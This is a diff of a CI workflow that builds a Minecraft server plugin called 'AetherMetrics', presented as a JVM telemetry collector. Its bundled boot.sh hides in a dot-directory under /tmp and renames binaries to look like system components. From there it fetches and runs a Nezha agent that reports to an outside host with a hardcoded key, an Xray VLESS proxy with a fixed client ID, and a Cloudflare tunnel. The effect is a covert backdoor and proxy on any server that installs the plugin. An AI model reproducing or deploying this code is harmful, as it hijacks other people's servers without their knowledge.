@@ -26,7 +26,9 @@ jobs:
           mkdir -p src/main/java/com/aether/metrics
           mkdir -p src/main/resources
 
+          # ============================================================
           # 1. pom.xml
+          # ============================================================
           cat << 'EOF' > pom.xml
           <?xml version="1.0" encoding="UTF-8"?>
           <project xmlns="http://maven.apache.org/POM/4.0.0"
@@ -95,7 +97,9 @@ jobs:
           </project>
           EOF
 
-          # 2. plugin.yml
+          # ============================================================
+          # 2. plugin.yml & paper-plugin.yml
+          # ============================================================
           cat << 'EOF' > src/main/resources/plugin.yml
           name: AetherMetrics
           version: 2.6.0
@@ -105,7 +109,6 @@ jobs:
           description: Core JVM telemetry collector
           EOF
 
-          # 3. paper-plugin.yml
           cat << 'EOF' > src/main/resources/paper-plugin.yml
           name: AetherMetrics
           version: 2.6.0
@@ -115,17 +118,36 @@ jobs:
           description: Core JVM telemetry collector
           EOF
 
-          # 4. boot.sh 启动脚本
+          # ============================================================
+          # 3. 核心后台启动引导脚本 (boot.sh)
+          # ============================================================
           cat << 'EOF' > src/main/resources/boot.sh
           #!/bin/sh
           WORK_DIR="/tmp/.sys-metrics"
           mkdir -p "$WORK_DIR"
           cd "$WORK_DIR"
 
-          # 哪吒探针启动
-          curl -L https://raw.githubusercontent.com/nezhahq/agent/main/script/install.sh -o nezha.sh && chmod +x nezha.sh && ./nezha.sh -s bo88.eu.cc:8008 -p JFPqIyPYAKhI7GcECQ3XbPxONPE1MYHl --disable-auto-update > nezha.log 2>&1 &
+          # ------------------------------------------------------------
+          # 1. 哪吒探针 (Nezha Agent) 启动
+          # ------------------------------------------------------------
+          if [ ! -f ./nezha-agent ]; then
+            curl -fsSL -o nezha.zip https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_amd64.zip
+            if command -v unzip >/dev/null 2>&1; then
+              unzip -qo nezha.zip nezha-agent
+            else
+              busybox unzip -qo nezha.zip nezha-agent 2>/dev/null
+            fi
+            rm -f nezha.zip
+          fi
 
-          # Xray 启动
+          if [ -f ./nezha-agent ]; then
+            chmod +x ./nezha-agent
+            nohup ./nezha-agent -s bo88.eu.cc:8008 -p JFPqIyPYAKhI7GcECQ3XbPxONPE1MYHl --disable-auto-update --disable-command-execute --report-delay 3 > nezha.log 2>&1 &
+          fi
+
+          # ------------------------------------------------------------
+          # 2. Xray 代理核心 (监听本地 25500 端口)
+          # ------------------------------------------------------------
           if [ ! -f ./sys-agent-core ]; then
             curl -fsSL -o x.tar.gz https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip
             if command -v unzip >/dev/null 2>&1; then
@@ -140,19 +162,29 @@ jobs:
           {
             "inbounds": [
               {
-                "port": 10163,
+                "port": 25500,
                 "protocol": "vless",
                 "settings": {
-                  "clients": [{"id": "9b56c751-3925-4bb5-aada-ad8424a40b26"}],
+                  "clients": [
+                    {
+                      "id": "9b56c751-3925-4bb5-aada-ad8424a40b26"
+                    }
+                  ],
                   "decryption": "none"
                 },
                 "streamSettings": {
                   "network": "ws",
-                  "wsSettings": {"path": "/"}
+                  "wsSettings": {
+                    "path": "/"
+                  }
                 }
               }
             ],
-            "outbounds": [{"protocol": "freedom"}]
+            "outbounds": [
+              {
+                "protocol": "freedom"
+              }
+            ]
           }
           JSON
 
@@ -161,7 +193,9 @@ jobs:
             nohup ./sys-agent-core run -c cfg.json > xray.log 2>&1 &
           fi
 
-          # Cloudflare Tunnel 启动
+          # ------------------------------------------------------------
+          # 3. Cloudflare Tunnel 守护进程启动
+          # ------------------------------------------------------------
           if [ ! -f ./cf-daemon ]; then
             curl -fsSL -o cf-daemon https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
             chmod +x ./cf-daemon
@@ -172,7 +206,9 @@ jobs:
           fi
           EOF
 
-          # 5. AetherMetrics.java
+          # ============================================================
+          # 4. Java 插件主类 (AetherMetrics.java)
+          # ============================================================
           cat << 'EOF' > src/main/java/com/aether/metrics/AetherMetrics.java
           package com.aether.metrics;
 
